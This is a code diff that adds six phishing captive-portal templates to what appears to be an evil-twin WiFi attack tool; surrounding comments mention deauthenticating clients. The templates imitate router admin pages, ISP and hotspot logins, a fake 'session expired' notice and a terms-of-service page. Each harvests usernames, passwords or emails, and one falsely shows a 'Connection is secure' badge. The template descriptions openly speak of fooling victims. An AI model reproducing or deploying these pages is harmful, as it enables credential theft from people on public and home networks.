@@ -573,6 +573,237 @@ export function selectTwinTarget(aps, { ssid, bssid } = {}) {
   };
 }
 
+// ── the page templates ───────────────────────────────────────────────────────
+// The operator picks a template that matches the target network's expected
+// captive portal. A generic "Sign In" page on a coffee shop WiFi does not fool
+// anyone. Every template is a single function of {ssid} so the real SSID is
+// baked in — no shipped default ever claims the name of an actual network.
+//
+// A template is { id, label, desc, fn(ssid) -> html }. The fn signature ensures
+// the SSID is always explicit: a blank SSID means the operator has not picked
+// yet, and a template that ignores it is a template that ships a canned claim.
+
+/**
+ * @typedef {{id:string, label:string, desc:string, fn:(ssid:string)=>string}} PortalTemplate
+ */
+
+/** @type {PortalTemplate[]} */
+export const PORTAL_TEMPLATES = [
+  {
+    id: 'router-login',
+    label: 'Router admin login',
+    desc: 'Looks like a home router asking you to log in — Netgear, Linksys, TP-Link style.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>${escHtml(ssid || 'Router')} — Administration</title>
+<style>
+ body{font:15px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#e8eaed;color:#202124}
+ .card{background:#fff;padding:28px 24px;border-radius:8px;max-width:360px;width:100%;
+       box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.24)}
+ h1{font-size:18px;margin:0 0 4px;font-weight:500}
+ .sub{color:#5f6368;font-size:13px;margin:0 0 20px}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#333}
+ input{width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;font-size:15px;
+       box-sizing:border-box;margin-bottom:14px;background:#fff;color:inherit}
+ button{width:100%;padding:11px;border:0;border-radius:4px;background:#1a73e8;color:#fff;
+        font-size:14px;font-weight:500;cursor:pointer}
+ .lock{display:flex;align-items:center;gap:6px;color:#5f6368;font-size:12px;margin-top:12px}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <h1>${escHtml(ssid || 'Router')}</h1>
+  <p class="sub">Sign in to access the router settings</p>
+  <label for="u">Username</label>
+  <input id="u" name="username" autocomplete="username" autocapitalize="none" spellcheck="false" value="admin">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password" placeholder="admin or your admin password">
+  <button type="submit">Sign in</button>
+  <div class="lock">&#128274; Connection is secure</div>
+</form></body></html>`,
+  },
+  {
+    id: 'isp-portal',
+    label: 'ISP captive portal',
+    desc: 'Looks like an ISP login page — Comcast/Xfinity, AT&T, Spectrum style.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Sign In</title>
+<style>
+ body{font:16px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#f5f5f5;color:#222}
+ .card{background:#fff;padding:28px 24px;border-radius:12px;max-width:360px;width:100%;
+       box-shadow:0 4px 12px rgba(0,0,0,.08)}
+ .logo{text-align:center;margin-bottom:18px;font-size:22px;font-weight:700;color:#0073e6}
+ h1{font-size:17px;margin:0 0 6px;text-align:center}
+ p{color:#666;font-size:13px;margin:0 0 18px;text-align:center}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#444}
+ input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:15px;
+       box-sizing:border-box;margin-bottom:14px;background:#fff;color:inherit}
+ button{width:100%;padding:12px;border:0;border-radius:8px;background:#0073e6;color:#fff;
+        font-size:15px;font-weight:600;cursor:pointer}
+ .help{text-align:center;margin-top:14px;font-size:12px}
+ .help a{color:#0073e6;text-decoration:none}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <div class="logo">${escHtml(ssid || 'WiFi')}</div>
+  <h1>Sign in to connect</h1>
+  <p>Enter your account credentials to access the internet.</p>
+  <label for="u">Email or username</label>
+  <input id="u" name="username" type="text" autocomplete="username" autocapitalize="none" spellcheck="false">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password">
+  <button type="submit">Connect</button>
+  <div class="help"><a href="#">Forgot password?</a> &middot; <a href="#">Create account</a></div>
+</form></body></html>`,
+  },
+  {
+    id: 'session-expired',
+    label: 'Session expired',
+    desc: 'Claims the user session timed out and they must re-authenticate — good for networks where the victim was already connected.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Session Expired</title>
+<style>
+ body{font:15px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#f0f2f5;color:#1c1e21}
+ .card{background:#fff;padding:26px 24px;border-radius:8px;max-width:380px;width:100%;
+       box-shadow:0 2px 8px rgba(0,0,0,.1)}
+ .warn{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:10px 14px;
+       margin-bottom:18px;font-size:13px;color:#856404}
+ h1{font-size:17px;margin:0 0 8px}
+ p{color:#606770;font-size:13px;margin:0 0 16px}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#444}
+ input{width:100%;padding:10px;border:1px solid #ccd0d5;border-radius:6px;font-size:15px;
+       box-sizing:border-box;margin-bottom:12px;background:#fff;color:inherit}
+ button{width:100%;padding:11px;border:0;border-radius:6px;background:#1877f2;color:#fff;
+        font-size:14px;font-weight:600;cursor:pointer}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <div class="warn">&#9888; Your session has expired. Please sign in again to continue using this network.</div>
+  <h1>${escHtml(ssid || 'Network')}</h1>
+  <p>For your security, this network requires periodic re-authentication.</p>
+  <label for="u">Email or phone</label>
+  <input id="u" name="username" type="text" autocomplete="username" autocapitalize="none" spellcheck="false">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password">
+  <button type="submit">Sign in</button>
+</form></body></html>`,
+  },
+  {
+    id: 'terms-of-service',
+    label: 'Terms of service',
+    desc: 'A WiFi ToS / acceptable-use page that asks for a name or email to proceed. Low friction — no password needed.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Terms of Service</title>
+<style>
+ body{font:15px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#111;color:#eee}
+ .card{background:#1e1e1e;padding:26px 24px;border-radius:10px;max-width:380px;width:100%;
+       border:1px solid #333}
+ h1{font-size:18px;margin:0 0 10px;font-weight:600}
+ .tos{background:#2a2a2a;border-radius:6px;padding:12px;margin-bottom:18px;font-size:11px;
+      color:#aaa;max-height:120px;overflow-y:auto;line-height:1.4}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#ccc}
+ input{width:100%;padding:10px;border:1px solid #444;border-radius:6px;font-size:15px;
+       box-sizing:border-box;margin-bottom:12px;background:#2a2a2a;color:#eee}
+ button{width:100%;padding:11px;border:0;border-radius:6px;background:#4caf50;color:#fff;
+        font-size:14px;font-weight:600;cursor:pointer}
+ .check{display:flex;align-items:center;gap:8px;margin-bottom:14px;font-size:13px;color:#ccc}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <h1>${escHtml(ssid || 'Guest WiFi')}</h1>
+  <div class="tos">By using this network, you agree to not use it for any illegal or unauthorized purpose. We reserve the right to monitor and log all traffic. Your use of this service constitutes acceptance of these terms. Violations may result in termination of access and reporting to appropriate authorities. This network is provided as-is with no warranty of any kind. Do not transmit sensitive information over this connection.</div>
+  <label for="u">Your name</label>
+  <input id="u" name="username" type="text" autocomplete="name" autocapitalize="words" placeholder="Enter your name to continue">
+  <label for="p">Email (optional)</label>
+  <input id="p" name="password" type="email" autocomplete="email" placeholder="your@email.com">
+  <button type="submit">Accept &amp; Connect</button>
+</form></body></html>`,
+  },
+  {
+    id: 'social-login',
+    label: 'Social / email login',
+    desc: 'A modern sign-in page with social login buttons — looks like a public hotspot portal.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in — ${escHtml(ssid || 'WiFi')}</title>
+<style>
+ body{font:16px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#fafafa;color:#333}
+ .card{background:#fff;padding:30px 24px;border-radius:16px;max-width:360px;width:100%;
+       box-shadow:0 8px 30px rgba(0,0,0,.08)}
+ h1{font-size:20px;margin:0 0 4px;text-align:center}
+ .sub{color:#888;font-size:12px;margin:0 0 20px;text-align:center}
+ .social{display:flex;gap:8px;margin-bottom:16px}
+ .sbtn{flex:1;padding:10px 8px;border:1px solid #e0e0e0;border-radius:8px;background:#fff;
+       font-size:12px;font-weight:500;text-align:center;color:#555;cursor:pointer}
+ .divider{display:flex;align-items:center;gap:10px;margin:0 0 14px;color:#bbb;font-size:11px}
+ .divider:before,.divider:after{content:"";flex:1;border-top:1px solid #e0e0e0}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#555}
+ input{width:100%;padding:11px;border:1px solid #e0e0e0;border-radius:8px;font-size:14px;
+       box-sizing:border-box;margin-bottom:12px;background:#fff;color:inherit}
+ button{width:100%;padding:12px;border:0;border-radius:8px;background:#111;color:#fff;
+        font-size:14px;font-weight:600;cursor:pointer}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <h1>Welcome back</h1>
+  <p class="sub">Sign in to ${escHtml(ssid || 'this network')}</p>
+  <div class="social">
+    <div class="sbtn">Google</div>
+    <div class="sbtn">Facebook</div>
+    <div class="sbtn">Apple</div>
+  </div>
+  <div class="divider">or sign in with email</div>
+  <label for="u">Email</label>
+  <input id="u" name="username" type="email" autocomplete="email" autocapitalize="none" spellcheck="false">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password">
+  <button type="submit">Sign in</button>
+</form></body></html>`,
+  },
+  {
+    id: 'generic',
+    label: 'Generic sign-in',
+    desc: 'A plain sign-in page. Minimal, no branding. The default fallback.',
+    fn: (ssid) => `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to continue</title>
+<style>
+ body{font:16px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#f4f4f6;color:#16181d}
+ .card{background:#fff;padding:26px 24px;border-radius:14px;max-width:340px;width:100%;
+       box-shadow:0 2px 18px rgba(0,0,0,.10)}
+ h1{font-size:19px;margin:0 0 6px}
+ p{color:#5a5f6a;margin:0 0 18px;font-size:14px}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#333}
+ input{width:100%;padding:11px;border:1px solid #ccd0d8;border-radius:9px;font-size:16px;
+       box-sizing:border-box;margin-bottom:14px;background:#fff;color:inherit}
+ button{width:100%;padding:12px;border:0;border-radius:9px;background:#1a73e8;color:#fff;
+        font-size:16px;font-weight:600}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <h1>Sign in to continue</h1>
+  <p>This network requires you to sign in before you can use it.</p>
+  <label for="u">Email or username</label>
+  <input id="u" name="username" autocomplete="username" autocapitalize="none" spellcheck="false">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password">
+  <button type="submit">Sign in</button>
+</form></body></html>`,
+  },
+];
+
+function escHtml(s) {
+  return String(s).replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
 // ── the sequencing: portal up FIRST, deauth second ─────────────────────────
 //
 // Brad's call, and the reason is not quietness — it is a race. A client that has
